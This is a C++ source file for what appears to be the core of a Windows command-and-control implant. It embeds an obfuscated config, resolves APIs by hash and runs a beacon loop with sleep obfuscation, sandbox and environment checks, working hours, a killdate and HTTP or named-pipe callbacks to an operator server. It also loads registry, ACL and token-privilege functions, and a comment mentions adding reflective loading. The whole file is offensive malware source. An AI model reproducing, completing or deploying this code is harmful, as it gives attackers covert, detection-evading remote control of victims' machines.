#include <core/include/implant.hpp>
namespace Implant {

    TXT_SECTION(F) BYTE Config[1024] = {
        0x41,0x41,0x41,0x41, 0x41,0x41,0x41,0x41,
    };

    VOID MainRoutine() {
        HEXANE

        do {
            Opsec::SleepObf();
            Opsec::SeRuntimeCheck();
            if (!Opsec::CheckTime()) {
                continue;
            }

            if (!Ctx->Session.Checkin && !Ctx->Transport.OutboundQueue) {
                Opsec::SeCheckEnvironment();
                if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                    return_defer(ntstatus);
                }
            }

            Message::MessageTransmit();

            if (ntstatus != ERROR_SUCCESS) {
                Ctx->Session.Retry++;
                if (Ctx->Session.Retry == 3) {
                    break;
                }
            } else {
                Ctx->Session.Retry = 0;
            }
        } while (ntstatus != ERROR_EXIT);

    defer:
        Memory::Context::ContextDestroy(Ctx);
    }

    VOID ReadConfig() {
        HEXANE

        PARSER Parser = { };
        Parser::CreateParser(&Parser, Config, sizeof(Config));
        x_memset(Config, 0, sizeof(Config));

        Parser::ParserBytecpy(&Parser, R_CAST(PBYTE, &Ctx->Root));
        Parser::ParserMemcpy(&Parser, &Ctx->Config.Key, nullptr);
        Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname, nullptr);

        //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->Config.Key, FALSE);
        // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary

        if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
            if (
                !(Ctx->Modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                !(Ctx->Modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                !(Ctx->Modules.advapi   = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                !(Ctx->Modules.iphlpapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                !(Ctx->Modules.mscoree  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
                return_defer(ERROR_MOD_NOT_FOUND);
            }
        }
        else {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if (
            !(F_PTR_HMOD(Ctx->CLR.CLRCreateInstance,              Ctx->Modules.mscoree, CLRCREATEINSTANCE)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpOpen,                  Ctx->Modules.winhttp, WINHTTPOPEN)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpConnect,               Ctx->Modules.winhttp, WINHTTPCONNECT)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpOpenRequest,           Ctx->Modules.winhttp, WINHTTPOPENREQUEST)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpAddRequestHeaders,     Ctx->Modules.winhttp, WINHTTPADDREQUESTHEADERS)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpSetOption,             Ctx->Modules.winhttp, WINHTTPSETOPTION)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpGetProxyForUrl,        Ctx->Modules.winhttp, WINHTTPGETPROXYFORURL)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, Ctx->Modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpSendRequest,           Ctx->Modules.winhttp, WINHTTPSENDREQUEST)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpReceiveResponse,       Ctx->Modules.winhttp, WINHTTPRECEIVERESPONSE)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpReadData,              Ctx->Modules.winhttp, WINHTTPREADDATA)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpQueryHeaders,          Ctx->Modules.winhttp, WINHTTPQUERYHEADERS)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpQueryDataAvailable,    Ctx->Modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpCloseHandle,           Ctx->Modules.winhttp, WINHTTPCLOSEHANDLE)) ||
            !(F_PTR_HMOD(Ctx->win32.GetAdaptersInfo,              Ctx->Modules.iphlpapi, GETADAPTERSINFO)) ||
            !(F_PTR_HMOD(Ctx->win32.CryptStringToBinaryA,         Ctx->Modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
            !(F_PTR_HMOD(Ctx->win32.CryptBinaryToStringA,         Ctx->Modules.crypt32, CRYPTBINARYTOSTRINGA)) ||
            !(F_PTR_HMOD(Ctx->win32.GetUserNameA,                 Ctx->Modules.advapi, GETUSERNAMEA)) ||
            !(F_PTR_HMOD(Ctx->win32.LookupAccountSidW,            Ctx->Modules.advapi, LOOKUPACCOUNTSIDW)) ||
            !(F_PTR_HMOD(Ctx->win32.LookupPrivilegeValueA,        Ctx->Modules.advapi, LOOKUPPRIVILEGEVALUEA)) ||
            !(F_PTR_HMOD(Ctx->win32.SetEntriesInAclA,             Ctx->Modules.advapi, SETENTRIESINACLA)) ||
            !(F_PTR_HMOD(Ctx->win32.AllocateAndInitializeSid,     Ctx->Modules.advapi, ALLOCATEANDINITIALIZESID)) ||
            !(F_PTR_HMOD(Ctx->win32.AddMandatoryAce,              Ctx->Modules.advapi, ADDMANDATORYACE)) ||
            !(F_PTR_HMOD(Ctx->win32.InitializeSecurityDescriptor, Ctx->Modules.advapi, INITIALIZESECURITYDESCRIPTOR)) ||
            !(F_PTR_HMOD(Ctx->win32.InitializeAcl,                Ctx->Modules.advapi, INITIALIZEACL)) ||
            !(F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorDacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
            !(F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorSacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
            !(F_PTR_HMOD(Ctx->win32.RegOpenKeyExA,                Ctx->Modules.advapi, REGOPENKEYEXA)) ||
            !(F_PTR_HMOD(Ctx->win32.RegCreateKeyExA,              Ctx->Modules.advapi, REGCREATEKEYEXA)) ||
            !(F_PTR_HMOD(Ctx->win32.RegSetValueExA,               Ctx->Modules.advapi, REGSETVALUEEXA)) ||
            !(F_PTR_HMOD(Ctx->win32.RegCloseKey,                  Ctx->Modules.advapi, REGCLOSEKEY)) ||
            !(F_PTR_HMOD(Ctx->win32.AdjustTokenPrivileges,        Ctx->Modules.advapi, ADJUSTTOKENPRIVILEGES)) ||
            !(F_PTR_HMOD(Ctx->win32.FreeSid,                      Ctx->Modules.advapi, FREESID))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
        Ctx->Config.Sleeptime       = Parser::UnpackDword(&Parser);
        Ctx->Config.Jitter          = Parser::UnpackDword(&Parser);
        Ctx->Config.WorkingHours    = Parser::UnpackDword(&Parser);
        Ctx->Config.Killdate        = Parser::UnpackDword64(&Parser);

        Ctx->Transport.OutboundQueue = nullptr;

#ifdef TRANSPORT_HTTP
        Ctx->Transport.http = S_CAST(PHTTP_CONTEXT, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP_CONTEXT)));

        Ctx->Transport.http->Handle     = nullptr;
        Ctx->Transport.http->Endpoints  = nullptr;
        Ctx->Transport.http->Headers    = nullptr;

        Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Useragent, nullptr);
        Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Address, nullptr  );

        Ctx->Transport.http->Port       = S_CAST(INT, Parser::UnpackDword(&Parser));
        Ctx->Transport.http->nEndpoints = Parser::UnpackDword(&Parser);
        Ctx->Transport.http->Endpoints  = S_CAST(LPWSTR*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2)));

        for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i], nullptr);
        }

        Ctx->Transport.http->Endpoints[Ctx->Transport.http->nEndpoints + 1] = nullptr;

        Parser::ParserStrcpy(&Parser, &Ctx->Transport.Domain, nullptr  );
        Ctx->Transport.bProxy = Parser::UnpackBool(&Parser);

        if (Ctx->Transport.bProxy) {
            Ctx->Transport.http->Access = INTERNET_OPEN_TYPE_PROXY;

            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyAddress, nullptr );
            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyUsername, nullptr );
            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyPassword, nullptr );

        } else {
            Ctx->Transport.http->ProxyUsername = nullptr;
            Ctx->Transport.http->ProxyPassword = nullptr;
        }
#endif
#ifdef TRANSPORT_PIPE
        Parser::ParserWcscpy(&Parser, &Ctx->Config.EgressPipename, nullptr);
#endif
    defer:
        Parser::DestroyParser(&Parser);
    }
}

VOID Entrypoint(HMODULE Base) {

    NT_ASSERT(Memory::Context::ContextInit());
    NT_ASSERT(Memory::Context::ResolveApi());
    NT_ASSERT(Implant::ReadConfig());
    Implant::MainRoutine();
}

